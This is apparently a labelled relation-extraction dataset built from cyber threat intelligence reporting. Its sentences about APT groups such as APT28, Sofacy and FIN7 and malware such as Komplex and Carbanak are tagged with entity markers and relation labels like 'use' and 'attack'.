28	Much like previous [E11:attacker] Oilrig [E12:attacker] attacks, the C2 domains used [E21:technique] typo-squatting [E22:technique] techniques in order to attempt to evade detection.	2	use
29	An article from the New York Times describes [E11:attacker] GhostNet [E12:attacker] as: A broader operation that, in less than two years, has infiltrated at least 1,295 computers in 103 countries, including many belonging to embassies, foreign ministries and other government offices, as well as the Dalai Lama’s Tibetan exile centers in India, Brussels, [E21:location] London [E22:location] and New York.	1	attack
30	We also discovered [E21:malware] Komplex [E22:malware] command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the [E11:attacker] Sofacy [E12:attacker] group,” researchers said. “We believe (it) may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.” “The Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system – a move that showcases their continued evolution toward multi-platform attacks,” they added.	2	use
31	Reporting on [E21:malware] SPLM [E22:malware]/XAgent certainly has followed this course in 2018 as SPLM/XAgent detections wind down globally, as has [E11:attacker] Sofacy [E12:attacker]’s use of this malware from our perspective.	2	use
32	Following the trail of existing public reporting, the tie to [E11:attacker] FIN7 [E12:attacker] is essentially made based on a download observed from a MuddyWater C2, of a non-public tool “[E21:malware] DNSMessenger [E22:malware]”.	2	use

39	The name “[E11:malware] Carbanak [E12:malware]” was coined by Kaspersky in this report – the malware authors refer to the backdoor as [E21:malware] Anunak [E22:malware].	5	similar
40	Many known APT network infiltration incidents in the past few years, notably the [E21:location] Chinese [E22:location] army APT1 and [E11:attacker] APT30 [E12:attacker] and the Russian army APT28, were related to cyber-espionage and intelligence gathering for national interests.	3	from

47	It is unlikely, but possible, that ISP-level [E11:malware] FinFisher [E12:malware] [E21:technique] MiTM [E22:technique] was used, considering multiple remote locations across the globe were targeted.	2	use
48	Did the Russian government direct the group responsible for the breaches and related data leaks? If so, is this simply a matter of accepted state espionage, or did it cross a line? Was the breach at the Democratic National Committee part of a concerted effort by the Russian government to interfere with the U.S. presidential election? The most consequential question remains unasked: How will Russia continue to employ a variety of methods – including hacks and leaks – to undermine the institutions, policies and actors that the Russian government perceives as constricting and condemning its forceful pursuit of its state aims? FireEye’s visibility into the operations of [E11:attacker] APT28 [E12:attacker] – a group we believe the [E21:location] Russian [E22:location] government sponsors – has given us insight into some of the government’s targets, as well as its objectives and the activities designed to further them.	3	from

Was the breach at the Democratic National Committee part of a concerted effort by the Russian government to interfere with the U.S. presidential election? The most consequential question remains unasked: How will Russia continue to employ a variety of methods – including hacks and leaks – to undermine the institutions, policies and actors that the Russian government perceives as constricting and condemning its forceful pursuit of its state aims? FireEye’s visibility into the operations of [E11:attacker] APT28 [E12:attacker] – a group we believe the Russian government sponsors – has given us insight into some of the [E21:industry] government [E22:industry]’s targets, as well as its objectives and the activities designed to further them.	1	attack
